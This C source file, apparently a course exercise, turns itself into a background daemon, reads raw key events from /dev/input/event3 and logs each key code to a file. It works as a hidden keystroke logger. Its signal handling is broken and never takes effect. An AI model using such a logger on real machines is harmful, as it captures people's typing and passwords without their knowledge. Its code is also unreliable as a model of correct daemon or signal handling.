#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <linux/input.h>

FILE *fp = NULL;

void sig_handler(int signo){
  if(signo == SIGUSR1){
    fprintf(fp, "Recieved SIGUSR1\n" );
  }
  if(signo==SIGKILL){
    fprintf(fp, "Recieved SIGKILL\n" );
  }
  if(signo==SIGSTOP){
    fprintf(fp, "Recieved SIGSTOP\n" );
  }
}

int main(){
  // Our process ID and Session ID
  pid_t pid, sid;

  //fork off the parent proecess
  pid = fork();
  if (pid < 0){
    exit(EXIT_FAILURE);
  }

  //if we got a good pid then we can kilt he parent

  if (pid > 0){
    exit(EXIT_SUCCESS);
  }

  //Change the file node mask
  umask(0);

  /* Open any logs here */
  fp = fopen("log.clase", "w+");

  //create a new session ID for the child process

  sid = setsid();
  if (sid < 0){
    //log the failure
    exit(EXIT_FAILURE);

  }

  //change directory, if not works locally where the .o is created

  //close out the stanard file descriptors

  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);

  //demon specific initialization goes here

  // the big loop
  int fd;
  fd = open("/dev/input/event3", O_RDONLY);
  struct input_event ev;

  while (1){
    read(fd, &ev, sizeof(struct input_event));
    if(ev.type == 1)
    fprintf(fp, "The value is: %i\n",ev.code);
    fflush(fp);
  }

  exit(EXIT_SUCCESS);


}
